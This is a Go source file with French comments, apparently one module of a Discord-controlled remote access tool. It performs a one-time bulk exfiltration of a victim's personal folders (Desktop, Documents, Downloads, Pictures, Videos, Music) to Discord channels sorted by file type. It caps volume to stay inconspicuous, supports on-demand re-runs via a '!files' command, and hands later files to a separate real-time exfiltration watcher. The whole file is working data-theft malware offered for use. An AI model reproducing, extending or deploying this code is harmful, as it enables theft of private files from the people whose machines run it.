// bulk.go — première extraction massive des dossiers utilisateur.
//
// Une seule fois par poste (marqueur `.bulk-done` dans le dossier de travail),
// le payload parcourt Bureau, Documents, Téléchargements, Images, Vidéos et
// Musique et pousse tout ce qui est exploitable dans les salons par type :
// documents dans `-files-docs`, images dans `-files-images`, archives et le
// reste dans `-files-new`.
//
// Le plafond (400 fichiers, 200 Mo, 30 minutes) évite de noyer le serveur et
// de saturer la connexion du poste. Les fichiers suivants sont pris par le
// veilleur temps réel (fileexfil.go).
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sync/atomic"
	"time"
)

const (
	bulkMaxFiles = 400
	bulkMaxBytes = 200 * 1024 * 1024
	bulkMaxTime  = 30 * time.Minute
)

var bulkRunning atomic.Bool
var bulkDone atomic.Bool

func bulkMarker() string { return workPath(".bulk-done") }

// bulkUploadAll lance l'extraction initiale. forceIgnoreMarker permet de la
// relancer à la demande (`!files`).
func bulkUploadAll(force bool) string {
	if bulkRunning.Load() {
		return "extraction massive déjà en cours."
	}
	if !force {
		if _, err := os.Stat(bulkMarker()); err == nil {
			bulkDone.Store(true)
			return ""
		}
	}
	bulkRunning.Store(true)
	defer bulkRunning.Store(false)
	bulkDone.Store(true)

	roots := exfilRoots()
	if len(roots) == 0 {
		return "aucun dossier utilisateur accessible."
	}

	count, sent := 0, 0
	deadline := time.Now().Add(bulkMaxTime)
	for _, root := range roots {
		if stopped.Load() {
			break
		}
		_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
			if err != nil || info == nil {
				return nil
			}
			if skipExfil(p, info) {
				if info.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}
			if info.IsDir() {
				return nil
			}
			if stopped.Load() || count >= bulkMaxFiles || sent >= bulkMaxBytes || time.Now().After(deadline) {
				return filepath.SkipAll
			}
			if info.Size() == 0 || info.Size() > exfilMaxBytes {
				return nil
			}
			ch := exfilChannelFor(p)
			if ch == "" {
				return nil
			}
			data, rerr := os.ReadFile(p)
			if rerr != nil {
				return nil
			}
			sendFilesTo(ch, fileOut{Name: filepath.Base(p), Data: data})
			count++
			sent += len(data)
			if count%15 == 0 {
				plog(fmt.Sprintf("bulk: %d fichiers, %d Mo", count, sent/1024/1024))
			}
			time.Sleep(650 * time.Millisecond) // limite de débit Discord
			return nil
		})
	}

	if !force {
		_ = os.WriteFile(bulkMarker(), []byte(time.Now().Format(time.RFC3339)), 0600)
	}
	plog(fmt.Sprintf("bulk: terminé — %d fichiers, %d Mo", count, sent/1024/1024))
	return fmt.Sprintf("extraction massive : **%d fichiers** envoyés (%d Mo).",
		count, sent/1024/1024)
}
